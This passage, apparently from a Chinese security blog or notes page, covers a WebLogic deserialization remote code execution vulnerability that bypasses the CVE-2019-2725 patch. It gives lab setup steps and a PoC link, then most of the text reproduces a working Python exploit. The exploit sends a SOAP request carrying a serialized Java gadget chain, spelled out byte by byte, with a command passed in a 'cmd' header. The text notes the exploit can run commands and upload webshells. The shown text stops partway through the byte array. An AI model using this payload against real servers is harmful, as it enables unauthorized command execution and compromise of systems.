2019\u5e7406\u670815\u65e5\uff0c360CERT\u76d1\u6d4b\u5230\u5728\u91ce\u7684Oracle Weblogic\u8fdc\u7a0b\u53cd\u5e8f\u5217\u5316\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u7ed5\u8fc7\u4e86\u6700\u65b0\u7684Weblogic\u8865\u4e01\uff08CVE-2019-2725\uff09\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u53d1\u9001\u7cbe\u5fc3\u6784\u9020\u7684\u6076\u610fHTTP\u8bf7\u6c42\uff0c\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\u8fdc\u7a0b\u6267\u884c\u547d\u4ee4\u3002\u76ee\u524d\u5b98\u65b9\u8865\u4e01\u672a\u53d1\u5e03\uff0c\u6f0f\u6d1e\u7ec6\u8282\u672a\u516c\u5f00\u3002360CERT\u7ecf\u7814\u5224\u540e\u5224\u5b9a\u8be5\u6f0f\u6d1e\u7efc\u5408\u8bc4\u7ea7\u4e3a\u201c\u9ad8\u5371\u201d\uff0c\u5f3a\u70c8\u5efa\u8bae\u53d7\u5f71\u54cd\u7684\u7528\u6237\u5c3d\u5feb\u6839\u636e\u4e34\u65f6\u4fee\u8865\u5efa\u8bae\u8fdb\u884c\u4e34\u65f6\u5904\u7f6e\uff0c\u9632\u6b62\u6536\u5230\u653b\u51fb\u8005\u653b\u51fb\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Weblogic 10.3.6 Weblogic 12.1.3 \u73af\u5883\u642d\u5efa \u00b6 git clone https://github.com/vulhub/vulhub.git cd vulhub/weblogic/CVE-2017-10271 docker-compose up -d \u8bbf\u95ee http://xxx.xxx.xxx.xxx:7001 \u6b63\u5e38\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6f0f\u6d1e\u5206\u6790\u6587\u7ae0 https://xz.aliyun.com/t/5024 \u8fd9\u91cc\u4f7f\u7528POC\u8fdb\u884c\u590d\u73b0 POC\u5730\u5740: https://github.com/TopScrew/CVE-2019-2725 [!NOTE] POC\u53ef\u5229\u7528\u4e8e\u547d\u4ee4\u6267\u884c\u548cWebshell\u4e0a\u4f20 \u6f0f\u6d1e\u5229\u7528POC \u00b6 https://github.com/TopScrew/CVE-2019-2725/blob/master/weblogic-2019-2725.py # encoding=utf8 import sys import requests from logzero import logger headers = { \"Accept-Language\" : \"zh-CN,zh;q=0.9,en;q=0.8\" , \"User-Agent\" : \"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50\" , \"Content-Type\" : \"text/xml\" , } def weblogic_10_3_6 ( ip , cmd ): headers = { \"Accept-Language\" : \"zh-CN,zh;q=0.9,en;q=0.8\" , \"User-Agent\" : \"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50\" , \"Content-Type\" : \"text/xml\" , \"cmd\" : \" %s \" % ( cmd ) } body = \"\"\"<?xml version=\"1.0\" encoding=\"utf-8\" ?> <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\"> <soapenv:Header> <wsa:Action/><wsa:RelatesTo/><asy:onAsyncDelivery/> <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"> <class><string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string><void> <array class=\"byte\" length=\"5010\"><void index=\"0\"><byte>-84</byte></void><void index=\"1\"><byte>-19</byte></void><void index=\"2\"><byte>0</byte></void><void index=\"3\"><byte>5</byte></void><void index=\"4\"><byte>115</byte></void><void index=\"5\"><byte>114</byte></void><void index=\"6\"><byte>0</byte></void><void index=\"7\"><byte>23</byte></void><void index=\"8\"><byte>106</byte></void><void index=\"9\"><byte>97</byte></void><void index=\"10\"><byte>118</byte></void><void index=\"11\"><byte>97</byte></void><void index=\"12\"><byte>46</byte></void><void index=\"13\"><byte>117</byte></void><void index=\"14\"><byte>116</byte></void><void index=\"15\"><byte>105</byte></void><void index=\"16\"><byte>108</byte></void><void index=\"17\"><byte>46</byte></void><void index=\"18\"><byte>76</byte></void><void index=\"19\"><byte>105</byte></void><void index=\"20\"><byte>110</byte></void><void index=\"21\"><byte>107</byte></void><void index=\"22\"><byte>101</byte></void><void index=\"23\"><byte>100</byte></void><void index=\"24\"><byte>72</byte></void><void index=\"25\"><byte>97</byte></void><void index=\"26\"><byte>115</byte></void><void index=\"27\"><byte>104</byte></void><void index=\"28\"><byte>83</byte></void><void index=\"29\"><byte>101</byte></void><void index=\"30\"><byte>116</byte></void><void index=\"31\"><byte>-40</byte></void><void index=\"32\"><byte>108</byte></void><void index=\"33\"><byte>-41</byte></void><void index=\"34\"><byte>90</byte></void><void index=\"35\"><byte>-107</byte></void><void index=\"36\"><byte>-35</byte></void><void index=\"37\"><byte>42</byte></void><void index=\"38\"><byte>30</byte></void><void index=\"39\"><byte>2</byte></void><void index=\"40\"><byte>0</byte></void><void index=\"41\"><byte>0</byte></void><void index=\"42\"><byte>120</byte></void><void index=\"43\"><byte>114</byte></void><void index=\"44\"><byte>0</byte></void><void index=\"45\"><byte>17</byte></void><void index=\"46\"><byte>106</byte></void><void index=\"47\"><byte>97</byte></void><void index=\"48\"><byte>118</byte></void><void index=\"49\"><byte>97</byte></void><void index=\"50\"><byte>46</byte></void><void index=\"51\"><byte>117</byte></void><void index=\"52\"><byte>116</byte></void><void index=\"53\"><byte>105</byte></void><void index=\"54\"><byte>108</byte></void><void index=\"55\"><byte>46</byte></void><void index=\"56\"><byte>72</byte></void><void index=\"57\"><byte>97</byte></void><void index=\"58\"><byte>115</byte></void><void index=\"59\"><byte>104</byte></void><void index=\"60\"><byte>83</byte></void><void index=\"61\"><byte>101</byte></void><void index=\"62\"><byte>116</byte></void><void index=\"63\"><byte>-70</byte></void><void index=\"64\"><byte>68</byte></void><void index=\"65\"><byte>-123</byte></void><void index=\"66\"><byte>-107</byte></void><void index=\"67\"><byte>-106</byte></void><void index=\"68\"><byte>-72</byte></void><void index=\"69\"><byte>-73</byte></void><void index=\"70\"><byte>52</byte></void><void index=\"71\"><byte>3</byte></void><void index=\"72\"><byte>0</byte></void><void index=\"73\"><byte>0</byte></void><void index=\"74\"><byte>120</byte></void><void index=\"75\"><byte>112</byte></void><void index=\"76\"><byte>119</byte></void><void index=\"77\"><byte>12</byte></void><void index=\"78\"><byte>0</byte></void><void index=\"79\"><byte>0</byte></void><void index=\"80\"><byte>0</byte></void><void index=\"81\"><byte>16</byte></void><void index=\"82\"><byte>63</byte></void><void index=\"83\"><byte>64</byte></void><void index=\"84\"><byte>0</byte></void><void index=\"85\"><byte>0</byte></void><void index=\"86\"><byte>0</byte></void><void index=\"87\"><byte>0</byte></void><void index=\"88\"><byte>0</byte></void><void index=\"89\"><byte>2</byte></void><void index=\"90\"><byte>115</byte></void><void index=\"91\"><byte>114</byte></void><void index=\"92\"><byte>0</byte></void><void index=\"93\"><byte>58</byte></void><void index=\"94\"><byte>99</byte></void><void index=\"95\"><byte>111</byte></void><void index=\"96\"><byte>109</byte></void><void index=\"97\"><byte>46</byte></void><void index=\"98\"><byte>115</byte></void><void index=\"99\"><byte>117</byte></void><void index=\"100\"><byte>110</byte></void><void index=\"101\"><byte>46</byte></void><void index=\"102\"><byte>111</byte></void><void index=\"103\"><byte>114</byte></void><void index=\"104\"><byte>103</byte></void><void index=\"105\"><byte>46</byte></void><void index=\"106\"><byte>97</byte></void><void index=\"107\"><byte>112</byte></void><void index=\"108\"><byte>97</byte></void><void index=\"109\"><byte>99</byte></void><void index=\"110\"><byte>104</byte></void><void index=\"111\"><byte>101</byte></void><void index=\"112\"><byte>46</byte></void><void index=\"113\"><byte>120</byte></void><void index=\"114\"><byte>97</byte></void><void index=\"115\"><byte>108</byte></void><void index=\"116\"><byte>97</byte></void><void index=\"117\"><byte>110</byte></void><void index=\"118\"><byte>46</byte></void><void index=\"119\"><byte>105</byte></void><void index=\"120\"><byte>110</byte></void><void index=\"121\"><byte>116</byte></void><void index=\"122\"><byte>101</byte></void><void index=\"123\"><byte>114</byte></void><void index=\"124\"><byte>110</byte></void><void index=\"125\"><byte>97</byte></void><void index=\"126\"><byte>108</byte></void><void index=\"127\"><byte>46</byte></void><void index=\"128\"><byte>120</byte></void><void index=\"129\"><byte>115</byte></void><void index=\"130\"><byte>108</byte></void><void index=\"131\"><byte>116</byte></void><void index=\"132\"><byte>99</byte></void><void index=\"133\"><byte>46</byte></void><void index=\"134\"><byte>116</byte></void><void index=\"135\"><byte>114</byte></void><void index=\"136\"><byte>97</byte></void><void index=\"137\"><byte>120</byte></void><void index=\"138\"><byte>46</byte></void><void index=\"139\"><byte>84</byte></void><void index=\"140\"><byte>101</byte></void><void index=\"141\"><byte>109</byte></void><void index=\"142\"><byte>112</byte></void><void index=\"143\"><byte>108</byte></void><void index=\"144\"><byte>97</byte></void><void index=\"145\"><byte>116</byte></void><void index=\"146\"><byte>101</byte></void><void index=\"147\"><byte>115</byte></void><void index=\"148\"><byte>73</byte></void><void index=\"149\"><byte>109</byte></void><void index=\"150\"><byte>112</byte></void><void index=\"151\"><byte>108</byte></void><void index=\"152\"><byte>9</byte></void><void index=\"153\"><byte>87</byte></void><void index=\"154\"><byte>79</byte></void><void index=\"155\"><byte>-63</byte></void><void index=\"156\"><byte>110</byte></void><void index=\"157\"><byte>-84</byte></void><void index=\"158\"><byte>-85</byte></void><void index=\"159\"><byte>51</byte></void><void index=\"160\"><byte>3</byte></void><void index=\"161\"><byte>0</byte></void><void index=\"162\"><byte>9</byte></void><void index=\"163\"><byte>73</byte></void><void index=\"164\"><byte>0</byte></void><void index=\"165\"><byte>13</byte></void><void index=\"166\"><byte>95</byte></void><void index=\"167\"><byte>105</byte></void><void index=\"168\"><byte>110</byte></void><void index=\"169\"><byte>100</byte></void><void index=\"170\"><byte>101</byte></void><void index=\"171\"><byte>110</byte></void><void index=\"172\"><byte>116</byte></void><void index=\"173\"><byte>78</byte></void><void index=\"174\"><byte>117</byte></void><void index=\"175\"><byte>109</byte></void><void index=\"176\"><byte>98</byte></void><void index=\"177\"><byte>101</byte></void><void index=\"178\"><byte>114</byte></void><void index=\"179\"><byte>73</byte></void><void index=\"180\"><byte>0</byte></void><void index=\"181\"><byte>14</byte></void><void index=\"182\"><byte>95</byte></void><void index=\"183\"><byte>116</byte></void><void index=\"184\"><byte>114</byte></void><void index=\"185\"><byte>97</byte></void><void index=\"186\"><byte>110</byte></void><void index=\"187\"><byte>115</byte></void><void index=\"188\"><byte>108</byte></void><void index=\"189\"><byte>101</byte></void><void index=\"190\"><byte>116</byte></void><void index=\"191\"><byte>73</byte></void><void index=\"192\"><byte>110</byte></void><void index=\"193\"><byte>100</byte></void><void index=\"194\"><byte>101</byte></void><void index=\"195\"><byte>120</byte></void><void index=\"196\"><byte>90</byte></void><void index=\"197\"><byte>0</byte></void><void index=\"198\"><byte>21</byte></void><void index=\"199\"><byte>95</byte></void><void index=\"200\"><byte>117</byte></void><void index=\"201\"><byte>115</byte></void><void index=\"202\"><byte>101</byte></void><void index=\"203\"><byte>83</byte></void><void index=\"204\"><byte>101</byte></void><void index=\"205\"><byte>114</byte></void><void index=\"206\"><byte>118</byte></void><void index=\"207\"><byte>105</byte></void><void index=\"208\"><byte>99</byte></void><void index=\"209\"><byte>101</byte></void><void index=\"210\"><byte>115</byte></void><void index=\"211\"><byte>77</byte></void><void index=\"212\"><byte>101</byte></void><void index=\"213\"><byte>99</byte></void><void index=\"214\"><byte>104</byte></void><void index=\"215\"><byte>97</byte></void><void index=\"216\"><byte>110</byte></void><void index=\"217\"><byte>105</byte></void><void index=\"218\"><byte>115</byte></void><void index=\"219\"><byte>109</byte></void><void index=\"220\"><byte>76</byte></void><void index=\"221\"><byte>0</byte></void><void index=\"222\"><byte>25</byte></void><void index=\"223\"><byte>95</byte></void><void index=\"224\"><byte>97</byte></void><void index=\"225\"><byte>99</byte></void><void index=\"226\"><byte>99</byte></void><void index=\"227\"><byte>101</byte></void><void index=\"228\"><byte>115</byte></void><void index=\"229\"><byte>115</byte></void><void index=\"230\"><byte>69</byte></void><void index=\"231\"><byte>120</byte></void><void index=\"232\"><byte>116</byte></void><void index=\"233\"><byte>101</byte></void><void index=\"234\"><byte>114</byte></void><void index=\"235\"><byte>110</byte></void><void index=\"236\"><byte>97</byte></void><void index=\"237\"><byte>108</byte></void><void index=\"238\"><byte>83</byte></void><void index=\"239\"><byte>116</byte></void><void index=\"240\"><byte>121</byte></void><void index=\"241\"><byte>108</byte></void><void index=\"242\"><byte>101</byte></void><void index=\"243\"><byte>115</byte></void><void index=\"244\"><byte>104</byte></void><void index=\"245\"><byte>101</byte></void><void index=\"246\"><byte>101</byte></void><void index=\"247\"><byte>116</byte></void><void index=\"248\"><byte>116</byte></void><void index=\"249\"><byte>0</byte></void><void index=\"250\"><byte>18</byte></void><void index=\"251\"><byte>76</byte></void><void index=\"252\"><byte>106</byte></void><void index=\"253\"><byte>97</byte></void><void index=\"254\"><byte>118</byte></void><void index=\"255\"><byte>97</byte></void><void index=\"256\"><byte>47</byte></void><void index=\"257\"><byte>108</byte></void><void index=\"258\"><byte>97</byte></void><void index=\"259\"><byte>110</byte></void><void index=\"260\"><byte>103</byte></void><void index=\"261\"><byte>47</byte></void><void index=\"262\"><byte>83</byte></void><void index=\"263\"><byte>116</byte></void><void index=\"264\"><byte>114</byte></void><void index=\"265\"><byte>105</byte></void><void index=\"266\"><byte>110</byte></void><void index=\"267\"><byte>103</byte></void><void index=\"268\"><byte>59</byte></void><void index=\"269\"><byte>76</byte></void><void index=\"270\"><byte>0</byte></void><void index=\"271\"><byte>11</byte></void><void index=\"272\"><byte>95</byte></void><void index=\"273\"><byte>97</byte></void><void index=\"274\"><byte>117</byte></void><void index=\"275\"><byte>120</byte></void><void index=\"276\"><byte>67</byte></void><void index=\"277\"><byte>108</byte></void><void index=\"278\"><byte>97</byte></void><void index=\"279\"><byte>115</byte></void><void index=\"280\"><byte>115</byte></void><void index=\"281\"><byte>101</byte></void><void index=\"282\"><byte>115</byte></void><void index=\"283\"><byte>116</byte></void><void index=\"284\"><byte>0</byte></void><void index=\"285\"><byte>59</byte></void><void index=\"286\"><byte>76</byte></void><void index=\"287\"><byte>99</byte></void><void index=\"288\"><byte>111</byte></void><void index=\"289\"><byte>109</byte></void><void index=\"290\"><byte>47</byte></void><void index=\"291\"><byte>115</byte></void><void index=\"292\"><byte>117</byte></void><void index=\"293\"><byte>110</byte></void><void index=\"294\"><byte>47</byte></void><void index=\"295\"><byte>111</byte></void><void index=\"296\"><byte>114</byte></void><void index=\"297\"><byte>103</byte></void><void index=\"298\"><byte>47</byte></void><void index=\"299\"><byte>97</byte></void><void index=\"300\"><byte>112</byte></void><void index=\"301\"><byte>97</byte></void><void index=\"302\"><byte>99</byte></void><void index=\"303\"><byte>104</byte></void><void index=\"304\"><byte>101</byte></void><void index=\"305\"><byte>47</byte></void><void index=\"306\"><byte>120</byte></void><void index=\"307\"><byte>97</byte></void><void index=\"308\"><byte>108</byte></void><void index=\"309\"><byte>97</byte></void><void index=\"310\"><byte>110</byte></void><void index=\"311\"><byte>47</byte></void><void index=\"312\"><byte>105</byte></void><void index=\"313\"><byte>110</byte></void><void index=\"314\"><byte>116</byte></void><void index=\"315\"><byte>101</byte></void><void index=\"316\"><byte>114</byte></void><void index=\"317\"><byte>110</byte></void><void index=\"318\"><byte>97</byte></void><void index=\"319\"><byte>108</byte></void><void index=\"320\"><byte>47</byte></void><void index=\"321\"><byte>120</byte></void><void index=\"322\"><byte>115</byte></void><void index=\"323\"><byte>108</byte></void><void index=\"324\"><byte>116</byte></void><void index=\"325\"><byte>99</byte></void><void index=\"326\"><byte>47</byte></void><void index=\"327\"><byte>114</byte></void><void index=\"328\"><byte>117</byte></void><void index=\"329\"><byte>110</byte></void><void index=\"330\"><byte>116</byte></void><void index=\"331\"><byte>105</byte></void><void index=\"332\"><byte>109</byte></void><void index=\"333\"><byte>101</byte></void><void index=\"334\"><byte>47</byte></void><void index=\"335\"><byte>72</byte></void><void index=\"336\"><byte>97</byte></void><void index=\"337\"><byte>115</byte></void><void index=\"338\"><byte>104</byte></void><void index=\"339\"><byte>116</byte></void><void index=\"340\"><byte>97</byte></void><void index=\"341\"><byte>98</byte></void><void index=\"342\"><byte>108</byte></void><void index=\"343\"><byte>101</byte></void><void index=\"344\"><byte>59</byte></void><void index=\"345\"><byte>91</byte></void><void index=\"346\"><byte>0</byte></void><void index=\"347\"><byte>10</byte></void><void index=\"348\"><byte>95</byte></void><void index=\"349\"><byte>98</byte></void><void index=\"350\"><byte>121</byte></void><void index=\"351\"><byte>116</byte></void><void index=\"352\"><byte>101</byte></void><void index=\"353\"><byte>99</byte></void><void index=\"354\"><byte>111</byte></void><void index=\"355\"><byte>100</byte></void><void index=\"356\"><byte>101</byte></void><void index=\"357\"><byte>115</byte></void><void index=\"358\"><byte>116</byte></void><void index=\"359\"><byte>0</byte></void><void index=\"360\"><byte>3</byte></void><void index=\"361\"><byte>91</byte></void><void index=\"362\"><byte>91</byte></void><void index=\"363\"><byte>66</byte></void><void index=\"364\"><byte>91</byte></void><void index=\"365\"><byte>0</byte></void><void index=\"366\"><byte>6</byte></void><void index=\"367\"><byte>95</byte></void><void index=\"368\"><byte>99</byte></void><void index=\"369\"><byte>108</byte></void><void index=\"370\"><byte>97</byte></void><void index=\"371\"><byte>115</byte></void><void index=\"372\"><byte>115</byte></void><void index=\"373\"><byte>116</byte></void><void index=\"374\"><byte>0</byte></void><void index=\"375\"><byte>18</byte></void><void index=\"376\"><byte>91</byte></void><void index=\"377\"><byte>76</byte></void><void index=\"378\"><byte>106</byte></void><void index=\"379\"><byte>97</byte></void><void index=\"380\"><byte>118</byte></void><void index=\"381\"><byte>97</byte></void><void index=\"382\"><byte>47</byte></void><void index=\"383\"><byte>108</byte></void><void index=\"384\"><byte>97</byte></void><void index=\"385\"><byte>110</byte></void><void index=\"386\"><byte>103</byte></void><void index=\"387\"><byte>47</byte></void><void index=\"388\"><byte>67</byte></void><void index=\"389\"><byte>108</byte></void><void index=\"390\"><byte>97</byte></void><void index=\"391\"><byte>115</byte></void><void index=\"392\"><byte>115</byte></void><void index=\"393\"><byte>59</byte></void><void index=\"394\"><byte>76</byte></void><void index=\"395\"><byte>0</byte></void><void index=\"396\"><byte>5</byte></void><void index=\"397\"><byte>95</byte></void><void index=\"398\"><byte>110</byte></void><void index=\"399\"><byte>97</byte></void><void index=\"400\"><byte>109</byte></void><void index=\"401\"><byte>101</byte></void><void index=\"402\"><byte>113</byte></void><void index=\"403\"><byte>0</byte></void><void index=\"404\"><byte>126</byte></void><void index=\"405\"><byte>0</byte></void><void index=\"406\"><byte>4</byte></void><void index=\"407\"><byte>76</byte></void><void index=\"408\"><byte>0</byte></void><void index=\"409\"><byte>17</byte></void><void index=\"410\"><byte>95</byte></void><void index=\"411\"><byte>111</byte></void><void index=\"412\"><byte>117</byte></void><void index=\"413\"><byte>116</byte></void><void index=\"414\"><byte>112</byte></void><void index=\"415\"><byte>117</byte></void><void index=\"416\"><byte>116</byte></void><void index=\"417\"><byte>80</byte></void><void index=\"418\"><byte>114</byte></void><void index=\"419\"><byte>111</byte></void><void index=\"420\"><byte>112</byte></void><void index=\"421\"><byte>101</byte></void><void index=\"422\"><byte>114</byte></void><void index=\"423\"><byte>116</byte></void><void index=\"424\"><byte>105</byte></void><void index=\"425\"><byte>101</byte></void><void index=\"426\"><byte>115</byte></void><void index=\"427\"><byte>116</byte></void><void index=\"428\"><byte>0</byte></void><void index=\"429\"><byte>22</byte></void><void index=\"430\"><byte>76</byte></void><void index=\"431\"><byte>106</byte></void><void index=\"432\"><byte>97</byte></void><void index=\"433\"><byte>118</byte></void><void index=\"434\"><byte>97</byte></void><void index=\"435\"><byte>47</byte></void><void index=\"436\"><byte>117</byte></void><void index=\"437\"><byte>116</byte></void><void index=\"438\"><byte>105</byte></void><void index=\"439\"><byte>108</byte></void><void index=\"440\"><byte>47</byte></void><void index=\"441\"><byte>80</byte></void><void index=\"442\"><byte>114</byte></void><void index=\"443\"><byte>111</byte></void><void index=\"444\"><byte>112</byte></void><void index=\"445\"><byte>101</byte></void><void index=\"446\"><byte>114</byte></void><void index=\"447\"><byte>116</byte></void><void index=\"448\"><byte>105</byte></void><void index=\"449\"><byte>101</byte></void><void index=\"450\"><byte>115</byte></void><void index=\"451\"><byte>59</byte></void><void index=\"452\"><byte>120</byte></void><void index=\"453\"><byte>112</byte></void><void index=\"454\"><byte>0</byte></void><void index=\"455\"><byte>0</byte></void><void index=\"456\"><byte>0</byte></void><void index=\"457\"><byte>0</byte></void><void index=\"458\"><byte>-1</byte></void><void index=\"459\"><byte>-1</byte></void><void index=\"460\"><byte>-1</byte></void><void index=\"461\"><byte>-1</byte></void><void index=\"462\"><byte>0</byte></void><void index=\"463\"><byte>116</byte></void><void index=\"464\"><byte>0</byte></void><void index=\"465\"><byte>3</byte></void><void index=\"466\"><byte>97</byte></void><void index=\"467\"><byte>108</byte></void><void index=\"468\"><byte>108</byte></void><void index=\"469\"><byte>112</byte></void><void index=\"470\"><byte>117</byte></void><void index=\"471\"><byte>114</byte></void><void index=\"472\"><byte>0</byte></void><void index=\"473\"><byte>3</byte></void><void index=\"474\"><byte>91</byte></void><void index=\"475\"><byte>91</byte></void><void index=\"476\"><byte>66</byte></void><void index=\"477\"><byte>75</byte></void><void index=\"478\"><byte>-3</byte></void><void index=\"479\"><byte>25</byte></void><void index=\"480\"><byte>21</byte></void><void index=\"481\"><byte>103</byte></void><void index=\"482\"><byte>103</byte></void><void index=\"483\"><byte>-37</byte></void><void index=\"484\"><byte>55</byte></void><void index=\"485\"><byte>2</byte></void><void index=\"486\"><byte>0</byte></void><void index=\"487\"><byte>0</byte></void><void index=\"488\"><byte>120</byte></void><void index=\"489\"><byte>112</byte></void><void index=\"490\"><byte>0</byte></void><void index=\"491\"><byte>0</byte></void><void index=\"492\"><byte>0</byte></void><void index=\"493\"><byte>2</byte></void><void index=\"494\"><byte>117</byte></void><void index=\"495\"><byte>114</byte></void><void index=\"496\"><byte>0</byte></void><void index=\"497\"><byte>2</byte></void><void index=\"498\"><byte>91</byte></void><void index=\"499\"><byte>66</byte></void><void index=\"500\"><byte>-84</byte></void><void index=\"501\"><byte>-13</byte></void><void index=\"502\"><byte>23</byte></void><void index=\"503\"><byte>-8</byte></void><void index=\"504\"><byte>6</byte></void><void index=\"505\"><byte>8</byte></void><void index=\"506\"><byte>84</byte></void><void index=\"507\"><byte>-32</byte></void><void index=\"508\"><byte>2</byte></void><void index=\"509\"><byte>0</byte></void><void index=\"510\"><byte>0</byte></void><void index=\"511\"><byte>120</byte></void><void index=\"512\"><byte>112</byte></void><void index=\"513\"><byte>0</byte></void><void index=\"514\"><byte>0</byte></void><void index=\"515\"><byte>14</byte></void><void index=\"516\"><byte>29</byte></void><void index=\"517\"><byte>-54</byte></void><void index=\"518\"><byte>-2</byte></void><void index=\"519\"><byte>-70</byte></void><void index=\"520\"><byte>-66</byte></void><void index=\"521\"><byte>0</byte></void><void index=\"522\"><byte>0</byte></void><void index=\"523\"><byte>0</byte></void><void index=\"524\"><byte>50</byte></void><void index=\"525\"><byte>0</byte></void><void index=\"526\"><byte>-70</byte></void><void index=\"527\"><byte>10</byte></void><void index=\"528\"><byte>0</byte></void><void index=\"529\"><byte>3</byte></void><void index=\"530\"><byte>0</byte></void><void index=\"531\"><byte>34</byte></void><void index=\"532\"><byte>7</byte></void><void index=\"533\"><byte>0</byte></void><void index=\"534\"><byte>-72</byte></void><void index=\"535\"><byte>7</byte></void><void index=\"536\"><byte>0</byte></void><void index=\"537\"><byte>37</byte></void><void index=\"538\"><byte>7</byte></void><void index=\"539\"><byte>0</byte></void><void index=\"540\"><byte>38</byte></void><void index=\"541\"><byte>1</byte></void><void index=\"542\"><byte>0</byte></void><void index=\"543\"><byte>16</byte></void><void index=\"544\"><byte>115</byte></void><void index=\"545\"><byte>101</byte></void><void index=\"546\"><byte>114</byte></void><void index=\"547\"><byte>105</byte></void><void index=\"548\"><byte>97</byte></void><void index=\"549\"><byte>108</byte></void><void index=\"550\"><byte>86</byte></void><void index=\"551\"><byte>101</byte></void><void index=\"552\"><byte>114</byte></void><void index=\"553\"><byte>115</byte></void><void index=\"554\"><byte>105</byte></void><void index=\"555\"><byte>111</byte></void><void index=\"556\"><byte>110</byte></void><void index=\"557\"><byte>85</byte></void><void index=\"558\"><byte>73</byte></void><void index=\"559\"><byte>68</byte></void><void index=\"560\"><byte>1</byte></void><void index=\"561\"><byte>0</byte></void><void index=\"562\"><byte>1</byte></void><void index=\"563\"><byte>74</byte></void><void index=\"564\"><byte>1</byte></void><void index=\"565\"><byte>0</byte></void><void index=\"566\"><byte>13</byte></void><void index=\"567\"><byte>67</byte></void><void index=\"568\"><byte>111</byte></void><void index=\"569\"><byte>110</byte></void><void index=\"570\"><byte>115</byte></void><void index=\"571\"><byte>116</byte></void><void index=\"572\"><byte>97</byte></void><void index=\"573\"><byte>110</byte></void><void index=\"574\"><byte>116</byte></void><void index=\"575\"><byte>86</byte></void><void index=\"576\"><byte>97</byte></void><void index=\"577\"><byte>108</byte></void><void index=\"578\"><byte>117</byte></void><void index=\"579\"><byte>101</byte></void><void index=\"580\"><byte>5</byte></void><void index=\"581\"><byte>-83</byte></void><void index=\"582\"><byte>32</byte></void><void index=\"583\"><byte>-109</byte></void><void index=\"584\"><byte>-13</byte></void><void index=\"585\"><byte>-111</byte></void><void index=\"586\"><byte>-35</byte></void><void index=\"587\"><byte>-17</byte></void><void index=\"588\"><byte>62</byte></void><void index=\"589\"><byte>1</byte></void><void index=\"590\"><byte>0</byte></void><void index=\"591\"><byte>6</byte></void><void index=\"592\"><byte>60</byte></void><void index=\"593\"><byte>105</byte></void><void index=\"594\"><byte>110</byte></void><void index=\"595\"><byte>105</byte></void><void index=\"596\"><byte>116</byte></void><void index=\"597\"><byte>62</byte></void><void index=\"598\"><byte>1</byte></void><void index=\"599\"><byte>0</byte></void><void index=\"600\"><byte>3</byte></void><void index=\"601\"><byte>40</byte></void><void index=\"602\"><byte>41</byte></void><void index=\"603\"><byte>86</byte></void><void index=\"604\"><byte>1</byte></void><void index=\"605\"><byte>0</byte></void><void index=\"606\"><byte>4</byte></void><void index=\"607\"><byte>67</byte></void><void index=\"608\"><byte>111</byte></void><void index=\"609\"><byte>100</byte></void><void index=\"610\"><byte>101</byte></void><void index=\"611\"><byte>1</byte></void><void index=\"612\"><byte>0</byte></void><void index=\"613\"><byte>15</byte></void><void index=\"614\"><byte>76</byte></void><void index=\"615\"><byte>105</byte></void><void index=\"616\"><byte>110</byte></void><void index=\"617\"><byte>101</byte></void><void index=\"618\"><byte>78</byte></void><void index=\"619\"><byte>117</byte></void><void index=\"620\"><byte>109</byte></void><void index=\"621\"><byte>98</byte></void><void index=\"622\"><byte>101</byte></void><void index=\"623\"><byte>114</byte></void><void index=\"624\"><byte>84</byte></void><void index=\"625\"><byte>97</byte></void><void index=\"626\"><byte>98</byte></void><void index=\"627\"><byte>108</byte></void><void index=\"628\"><byte>101</byte></void><void index=\"629\"><byte>1</byte></void><void index=\"630\"><byte>0</byte></void><void index=\"631\"><byte>18</byte></void><void index=\"632\"><byte>76</byte></void><void index=\"633\"><byte>111</byte></void><void index=\"634\"><byte>99</byte></void><void index=\"635\"><byte>97</byte></void><void index=\"636\"><byte>108</byte></void><void index=\"637\"><byte>86</byte></void><void index=\"638\"><byte>97</byte></void><void index=\"639\"><byte>114</byte></void><void index=\"640\"><byte>105</byte></void><void index=\"641\"><byte>97</byte></void><void index=\"642\"><byte>98</byte></void><void index=\"643\"><byte>108</byte></void><void index=\"644\"><byte>101</byte></void><void index=\"645\"><byte>84</byte></void><void index=\"646\"><byte>97</byte></void><void index=\"647\"><byte>98</byte></void><void index=\"648\"><byte>108</byte></void><void index=\"649\"><byte>101</byte></void><void index=\"650\"><byte>1</byte></void><void index=\"651\"><byte>0</byte></void><void index=\"652\"><byte>4</byte></void><void index=\"653\"><byte>116</byte></void><void index=\"654\"><byte>104</byte></void><void index=\"655\"><byte>105</byte></void><void index=\"656\"><byte>115</byte></void><void index=\"657\"><byte>1</byte></void><void index=\"658\"><byte>0</byte></void><void index=\"659\"><byte>19</byte></void><void index=\"660\"><byte>83</byte></void><void index=\"661\"><byte>116</byte></void><void index=\"662\"><byte>117</byte></void><void index=\"663\"><byte>98</byte></void><void index=\"664\"><byte>84</byte></void><void index=\"665\"><byte>114</byte></void><void index=\"666\"><byte>97</byte></void><void index=\"667\"><byte>110</byte></void><void index=\"668\"><byte>115</byte></void><void index=\"669\"><byte>108</byte></void><void index=\"670\"><byte>101</byte></void><void index=\"671\"><byte>116</byte></void><void index=\"672\"><byte>80</byte></void><void index=\"673\"><byte>97</byte></void><void index=\"674\"><byte>121</byte></void><void index=\"675\"><byte>108</byte></void><void index=\"676\"><byte>111</byte></void><void index=\"677\"><byte>97</byte></void><void index=\"678\"><byte>100</byte></void><void index=\"679\"><byte>1</byte></void><void index=\"680\"><byte>0</byte></void><void index=\"681\"><byte>12</byte></void><void index=\"682\"><byte>73</byte></void><void index=\"683\"><byte>110</byte></void><void index=\"684\"><byte>110</byte></void><void index=\"685\"><byte>101</byte></void><void index=\"686\"><byte>114</byte></void><void index=\"687\"><byte>67</byte></void><void index=\"688\"><byte>108</byte></void><void 